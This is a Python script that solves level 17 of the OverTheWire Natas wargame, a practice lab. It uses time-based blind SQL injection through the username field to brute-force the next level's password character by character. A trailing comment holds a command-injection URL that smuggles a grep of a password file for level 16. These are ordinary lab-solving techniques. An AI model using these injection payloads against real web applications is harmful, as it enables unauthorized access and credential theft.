
import re,requests,base64,natas,string

USER='natas17'
PASSWORD=natas.get_credential(USER)

URL='http://natas17.natas.labs.overthewire.org/index.php'

def main():
    b64 = base64.b64encode('%s:%s' % (USER,PASSWORD))
    
    password = ''
    running = True
    while (running):
        found = False
        for c in string.ascii_letters + string.digits :
            if (guessed_correct(password + c, b64)):
                password += c
                found = True
                print(password)
                break
        if (not found):
            break
    
    if (len(password) > 30):
        print('found password: %s' % password)
        print('adding to credentials....')
        natas.save_credentials('natas18',password)
        print('done')

            

def guessed_correct(password, b64):
    QUERY='natas18" and password like binary "%s%s" and sleep(5) #' % (password,'%')
    
    try:

        response = requests.post(
                URL,
                headers=dict(Authorization='Basic %s' % b64),
                data={'username' : QUERY},
                timeout=1
        )
        
        return False
    except Exception as e:
        return True

if __name__=='__main__':
    main()

#    http://natas16.natas.labs.overthewire.org/index.php?needle=giraffes%24%28grep+b+etc%2Fnatas_webpass%2Fnatas17%29
